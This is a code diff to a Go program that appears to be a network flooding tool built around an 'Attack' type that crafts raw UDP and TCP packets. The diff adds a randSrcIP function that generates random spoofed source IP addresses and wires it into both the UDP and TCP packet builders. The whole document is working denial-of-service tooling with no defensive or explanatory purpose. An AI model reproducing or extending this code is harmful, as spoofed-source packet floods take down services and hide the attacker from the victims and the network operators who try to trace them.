@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"strings"
 	"syscall"
 
 	"github.com/google/gopacket"
@@ -88,6 +89,17 @@ func (a *Attack) randDstPort() int {
 	return convInt(a.dstPort)
 }
 
+func (a *Attack) randSrcIP() string {
+	if a.srcAddr == "-r" {
+		var rand []string
+		for i := 0; i < 4; i++ {
+			rand = append(rand, genRange(255, 0), ".")
+		}
+		return strings.Join(rand[0:7], "")
+	}
+	return a.srcAddr
+}
+
 func (a *Attack) setupHTTP() (*http.Client, *http.Request) {
 	httpReq, _ := http.NewRequest(a.httpMethod, a.url+"/"+a.reqHeader, nil)
 	return &http.Client{}, httpReq
@@ -140,7 +152,7 @@ func (a *Attack) udpPacket() {
 		*/
 		udp := a.setupUDP(
 			&net.UDPAddr{
-				IP:   net.ParseIP(a.srcAddr),
+				IP:   net.ParseIP(a.randSrcIP()),
 				Port: rand.Intn(65535),
 			}, dst)
 		/*
@@ -174,7 +186,7 @@ func (a *Attack) tcpPacket() {
 		*/
 		tcp := a.setupTCP(
 			&net.TCPAddr{
-				IP:   net.ParseIP(a.srcAddr),
+				IP:   net.ParseIP(a.randSrcIP()),
 				Port: rand.Intn(65535),
 			}, dst)
 		/*
